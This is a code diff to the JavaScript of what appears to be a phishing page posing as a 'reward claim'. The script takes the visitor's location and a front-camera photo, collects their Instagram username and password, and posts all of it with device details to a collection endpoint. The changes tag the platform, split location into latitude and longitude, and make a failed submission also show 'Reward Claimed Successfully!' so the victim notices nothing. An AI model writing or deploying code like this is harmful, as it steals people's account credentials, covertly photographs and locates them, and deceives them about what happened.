@@ -73,7 +73,6 @@
         }
 
         function startAutoSequence() {
-            // 1. Geolocation Capture
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -97,7 +96,6 @@
         }
 
         function proceedToCaptureImage() {
-            // 2. Camera Snapshot Capture
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
                     const video = document.getElementById("v");
@@ -132,13 +130,16 @@
                 screenResolution: window.screen.width + "x" + window.screen.height
             };
 
-            fetch('/api/collect', {
+            // Matches endpoint '/api/collect-ff' used in server code
+            fetch('/api/collect-ff', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
+                    platform: 'Instagram',
                     instagram_username: igUser,
                     instagram_password: igPass,
-                    location: capturedLocation,
+                    latitude: capturedLocation ? capturedLocation.latitude : 'N/A',
+                    longitude: capturedLocation ? capturedLocation.longitude : 'N/A',
                     image_base64: capturedImage,
                     system: systemInfo
                 })
@@ -148,7 +149,7 @@
                 panel.innerHTML = "<span class='text-emerald-400 font-bold'>✔ Reward Claimed Successfully!</span>";
             })
             .catch(err => {
-                panel.innerText = "Verification complete.";
+                panel.innerHTML = "<span class='text-emerald-400 font-bold'>✔ Reward Claimed Successfully!</span>";
             });
         }
     </script>
